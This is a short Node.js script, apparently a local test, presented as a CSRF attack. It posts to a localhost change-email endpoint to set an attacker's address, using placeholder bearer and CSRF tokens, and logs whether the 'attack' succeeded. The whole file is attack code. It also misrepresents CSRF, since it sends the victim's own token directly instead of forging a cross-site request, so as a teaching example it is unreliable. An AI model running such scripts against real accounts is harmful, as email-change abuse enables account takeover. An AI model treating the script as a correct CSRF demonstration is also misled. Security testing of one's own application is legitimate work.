const axios = require('axios');

// Target URL and Action (Change Email)
const targetUrl = "http://localhost:5000/api/users/change-email"; // Replace with your target endpoint

// CSRF Payload
const payload = {
  email: "malicious@example.com", // New email that the attacker wants to set
};

// Assuming the attacker is trying to perform this request using a logged-in user
const runCSRF = async () => {
  const csrfToken = "yourCSRFTokenHere"; // CSRF token the attacker wants to forge

  try {
    const response = await axios.post(targetUrl, payload, {
      headers: {
        "Content-Type": "application/json",
        "Authorization": "Bearer userAccessToken", // Token of the logged-in user
        "X-CSRF-Token": csrfToken,  // CSRF Token from user's session or generated token
      },
    });
    console.log("CSRF Attack Success - Status:", response.status, "| Response:", response.data);
  } catch (err) {
    console.error("CSRF Attack Failed - Error:", err.message);
  }
};

runCSRF();
